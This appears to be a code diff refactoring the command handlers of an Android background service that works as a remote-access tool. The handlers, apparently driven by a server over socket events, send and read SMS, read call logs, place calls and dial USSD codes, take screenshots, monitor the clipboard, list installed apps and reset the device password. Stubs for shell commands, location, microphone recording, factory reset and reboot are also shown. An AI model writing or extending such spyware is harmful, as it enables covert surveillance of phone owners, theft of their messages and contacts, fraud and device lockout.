@@ -6,12 +6,10 @@ import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -96,348 +94,282 @@ public class MainService extends Service {
         return START_STICKY;
     }
 
-    private Emitter.Listener sendSMS = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try{
-                int result = SMS.sendSMS(args[0].toString(), args[1].toString());
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                if (result == 0){
-                    jsonObject.put("status",  "success");
-                    jsonObject.put("message", "SMS to " + args[1].toString() + " sent successfully");
-                } else{
-                    jsonObject.put("status",  "failed");
-                    jsonObject.put("message", "SMS to " + args[1].toString() + " failed");
-                }
-                // emit result
-            } catch (Exception exception) {
-                Log.i("sendSMS", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener readSMS = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("data", SMS.readSMS(getApplicationContext()));
-                if (jsonObject.get("data") != null) {
-                    jsonObject.put("status",  "success");
-                    jsonObject.put("message", "SMS successfully read");
-                    // emit json
-                }else {
-                    jsonObject.put("status",  "failed");
-                    jsonObject.put("message", "Failed to read SMS");
-                    // emit failed
-                }
-            } catch (Exception exception) {
-                Log.i("readSMS", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener readCallLogs = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("data", Voice.readCallLog(getApplicationContext()));
-                if (jsonObject != null) {
-                    jsonObject.put("message", "");
-                    // emit json
-                }else {
-                    jsonObject.put("message", "");
-                    // emit failed
-                }
-            } catch (Exception exception) {
-                Log.i("readSMS", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener makePhoneCall = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                int result = Voice.phoneCall(getApplicationContext(), args[0].toString());
-                jsonObject.put("device_id", device_id);
-                if (result == 0) {
-                    jsonObject.put("status", "success");
-                    jsonObject.put("message", "Calling " + args[0].toString());
-                    // emit success
-                } else {
-                    jsonObject.put("status", "failed");
-                    jsonObject.put("message", "Call to " + args[0].toString() + " failed");
-                    // emit failure
-                }
-            } catch (Exception exception) {
-                Log.i("readSMS", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener dialUssd = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
-                if(result == "No USSD code supplied") {
-                    jsonObject.put("message", "");
-                    // emit fialed
-                } else if(result == "API level not supported"){
-                    jsonObject.put("message", "");
-                    // emit somethibg
-                }
-                else {
-                    jsonObject.put("message", "");
-                    // emit result
-                }
-            } catch (Exception exception) {
-                Log.i("dialUSSD", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener takePicture = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-//                jsonObject.put("bytes", );
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("takePicture", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener getCameraList = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject cameraList = Camera.findCameraList();
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("cameraList", cameraList);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("getCameraList", exception.getMessage());
-            }
-            // check if camera list isn't null then emit
-        }
-    };
-
-    private Emitter.Listener screenshot = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            ScreenCapture.screencap();
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("screenshot", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener changeWallpaper = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            // verify if image was set or not
-            new SetWallpaper(getApplicationContext(), args[0].toString());
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("changeWallpaper", exception.getMessage());
-            }
-            // emit
-        }
-    };
-
-    private Emitter.Listener recordMicrophone = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("recordMicrophone", exception.getMessage());
-            }
-        }
-    };
-
-    private Emitter.Listener listInstalledApps = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            List installedApps = InstalledApps.getInstalledApps(getApplicationContext());
+    private final Emitter.Listener sendSMS = args -> {
+        try{
+            int result = SMS.sendSMS(args[0].toString(), args[1].toString());
             JSONObject jsonObject = new JSONObject();
-            try {
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("data", installedApps.toString());
-                jsonObject.put("message", "");
-                // if json data is empty emit failed else success
-            } catch (Exception exception) {
-                Log.i("listInstalledApps", exception.getMessage());
+            jsonObject.put("device_id", device_id);
+            if (result == 0){
+                jsonObject.put("status",  "success");
+                jsonObject.put("message", "SMS to " + args[1].toString() + " sent successfully");
+            } else{
+                jsonObject.put("status",  "failed");
+                jsonObject.put("message", "SMS to " + args[1].toString() + " failed");
             }
+            // emit result
+        } catch (Exception exception) {
+            Log.i("sendSMS", exception.getMessage());
         }
     };
 
-    private Emitter.Listener vibratePhone = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            Vibrate.vibratePhone(getApplicationContext(), Integer.parseInt(args[0].toString()));
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("vibratePhone", exception.getMessage());
+    private final Emitter.Listener readSMS = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("data", SMS.readSMS(getApplicationContext()));
+            if (jsonObject.get("data") != null) {
+                jsonObject.put("status",  "success");
+                jsonObject.put("message", "SMS successfully read");
+                // emit json
+            }else {
+                jsonObject.put("status",  "failed");
+                jsonObject.put("message", "Failed to read SMS");
+                // emit failed
             }
+        } catch (Exception exception) {
+            Log.i("readSMS", exception.getMessage());
         }
     };
 
-    private Emitter.Listener writeContact = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
+    private final Emitter.Listener readCallLogs = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("data", Voice.readCallLog(getApplicationContext()));
+            if (jsonObject != null) {
                 jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("writeContact", exception.getMessage());
+                // emit json
+            }else {
+                jsonObject.put("message", "");
+                // emit failed
             }
+        } catch (Exception exception) {
+            Log.i("readSMS", exception.getMessage());
         }
     };
 
-    private Emitter.Listener readContact = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("readContact", exception.getMessage());
+    private final Emitter.Listener makePhoneCall = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            int result = Voice.phoneCall(getApplicationContext(), args[0].toString());
+            jsonObject.put("device_id", device_id);
+            if (result == 0) {
+                jsonObject.put("status", "success");
+                jsonObject.put("message", "Calling " + args[0].toString());
+                // emit success
+            } else {
+                jsonObject.put("status", "failed");
+                jsonObject.put("message", "Call to " + args[0].toString() + " failed");
+                // emit failure
             }
+        } catch (Exception exception) {
+            Log.i("readSMS", exception.getMessage());
         }
     };
 
-    private Emitter.Listener resetPassword = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            new DeviceManager(getApplicationContext(), new ComponentName(getApplicationContext(), MainActivity.class)).resetPassword("replace with new password");
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
+    private final Emitter.Listener dialUssd = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
+            if(result.equals("No USSD code supplied")) {
                 jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("resetPassword", exception.getMessage());
+                // emit fialed
+            } else if(result.equals("API level not supported")){
+                jsonObject.put("message", "");
+                // emit somethibg
             }
+            else {
+                jsonObject.put("message", "");
+                // emit result
+            }
+        } catch (Exception exception) {
+            Log.i("dialUSSD", exception.getMessage());
         }
     };
 
-    private Emitter.Listener sendSerialCommand = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("sendSerialCommand", exception.getMessage());
-            }
+    private final Emitter.Listener takePicture = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+//                jsonObject.put("bytes", );
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("takePicture", exception.getMessage());
         }
     };
 
-    private Emitter.Listener shCommand = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("shCommand", exception.getMessage());
-            }
+    private final Emitter.Listener getCameraList = args -> {
+        try {
+            JSONObject cameraList = Camera.findCameraList();
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("cameraList", cameraList);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("getCameraList", exception.getMessage());
+        }
+        // check if camera list isn't null then emit
+    };
+
+    private final Emitter.Listener screenshot = args -> {
+        ScreenCapture.screencap();
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("screenshot", exception.getMessage());
         }
     };
 
-    private Emitter.Listener getLocation = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("getLocation", exception.getMessage());
-            }
+    private final Emitter.Listener changeWallpaper = args -> {
+        // verify if image was set or not
+        new SetWallpaper(getApplicationContext(), args[0].toString());
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("changeWallpaper", exception.getMessage());
+        }
+        // emit
+    };
+
+    private final Emitter.Listener recordMicrophone = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("recordMicrophone", exception.getMessage());
         }
     };
 
-    private Emitter.Listener changeDevicePassword = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("changeDevicePassword", exception.getMessage());
-            }
+    private final Emitter.Listener listInstalledApps = args -> {
+        List installedApps = InstalledApps.getInstalledApps(getApplicationContext());
+        JSONObject jsonObject = new JSONObject();
+        try {
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("data", installedApps.toString());
+            jsonObject.put("message", "");
+            // if json data is empty emit failed else success
+        } catch (Exception exception) {
+            Log.i("listInstalledApps", exception.getMessage());
         }
     };
 
-    private Emitter.Listener factoryResetDevice = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("factoryResetDevice", exception.getMessage());
-            }
+    private final Emitter.Listener vibratePhone = args -> {
+        Vibrate.vibratePhone(getApplicationContext(), Integer.parseInt(args[0].toString()));
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("vibratePhone", exception.getMessage());
         }
     };
 
-    private Emitter.Listener rebootDevice = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-            } catch (Exception exception) {
-                Log.i("rebootDevice", exception.getMessage());
-            }
+    private final Emitter.Listener writeContact = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("writeContact", exception.getMessage());
         }
     };
 
-    private Emitter.Listener clipboardMonitoring = new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            ClipboardMonitoring clip = new ClipboardMonitoring(getApplicationContext());
-            try {
-                JSONObject jsonObject = new JSONObject();
-                jsonObject.put("device_id", device_id);
-                jsonObject.put("message", "");
-                jsonObject.put("clip", clip.getClipData());
-            } catch (Exception exception) {
-                Log.i("rebootDevice", exception.getMessage());
-            }
+    private final Emitter.Listener readContact = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("readContact", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener resetPassword = args -> {
+        new DeviceManager(getApplicationContext(), new ComponentName(getApplicationContext(), MainActivity.class)).resetPassword("replace with new password");
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("resetPassword", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener sendSerialCommand = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("sendSerialCommand", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener shCommand = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("shCommand", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener getLocation = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("getLocation", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener changeDevicePassword = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("changeDevicePassword", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener factoryResetDevice = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("factoryResetDevice", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener rebootDevice = args -> {
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("rebootDevice", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener clipboardMonitoring = args -> {
+        ClipboardMonitoring clip = new ClipboardMonitoring(getApplicationContext());
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+            jsonObject.put("clip", clip.getClipData());
+        } catch (Exception exception) {
+            Log.i("rebootDevice", exception.getMessage());
         }
     };
 
